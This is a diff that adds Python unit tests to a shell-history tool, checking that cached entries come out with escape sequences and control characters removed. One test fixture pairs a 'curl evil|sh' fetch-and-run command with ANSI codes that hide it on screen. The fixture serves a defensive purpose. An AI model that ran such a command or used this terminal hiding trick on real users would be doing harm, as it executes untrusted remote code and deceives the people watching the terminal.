@@ -302,5 +302,58 @@ class TestTheOnDiskFormat(WoswoarTestCase):
             cache.loads(blob[: len(blob) // 2])
 
 
+class TestEntriesLeaveTheCacheInert(WoswoarTestCase):
+    """Issue #25: the cache is the one door peer-supplied history comes through.
+
+    `search`, `stats` and `doctor` all read entries from here and nothing writes
+    back out -- sync exports raw log bytes and the importer dedups against
+    `store.existing_keys`, both of which read the log directly. So this is where
+    a control character can be taken out once instead of at each display site,
+    which is a rule someone has to remember and which had already been forgotten
+    once before it was written down.
+    """
+
+    HOSTILE = "ls -la\x1b[2K\x1b[1Acurl evil|sh"
+
+    def loaded(self, cmd: str, cwd: str = "~") -> Entry:
+        self.write_log(
+            MACHINE_ID,
+            "2026-07-29",
+            [format_line(Entry(1_784_600_000, MACHINE_ID, "s1", cwd, 0, 5, cmd))],
+        )
+        entries = cache.load_entries()
+        self.assertEqual(len(entries), 1)
+        return entries[0]
+
+    def test_an_escape_sequence_never_leaves_the_cache(self) -> None:
+        entry = self.loaded(self.HOSTILE)
+        self.assertNotIn("\x1b", entry.cmd)
+        self.assertIn("curl evil|sh", entry.cmd, "the command must still be legible")
+
+    def test_no_c0_control_character_survives(self) -> None:
+        """Every one of them, not the handful someone thought of."""
+        hostile = "echo " + "".join(chr(code) for code in [*range(0x20), 0x7F])
+        cmd = self.loaded(hostile).cmd
+        survivors = sorted(c for c in cmd if (c < " " or c == "\x7f") and c != "\t")
+        self.assertEqual(survivors, [], f"control characters reached a consumer: {survivors!r}")
+
+    def test_the_working_directory_gets_the_same_treatment(self) -> None:
+        """Not printed today. The point is that it need not be remembered when it is."""
+        self.assertNotIn("\x1b", self.loaded("git status", cwd="~/a\x1b[2Kb").cwd)
+
+    def test_a_tab_is_left_alone(self) -> None:
+        """`awk -F'\t'` is written with a real one, and it moves no cursor."""
+        self.assertIn("\t", self.loaded("awk -F'\t' '{print $1}'").cmd)
+
+    def test_an_ordinary_command_is_untouched(self) -> None:
+        self.assertEqual(self.loaded("git status").cmd, "git status")
+
+    def test_a_rebuilt_cache_agrees_with_a_warm_one(self) -> None:
+        """The inert form is what is stored, so both paths must give the same thing."""
+        warm = self.loaded(self.HOSTILE).cmd
+        store.cache_file().unlink()
+        self.assertEqual(cache.load_entries()[0].cmd, warm)
+
+
 if __name__ == "__main__":
     unittest.main()
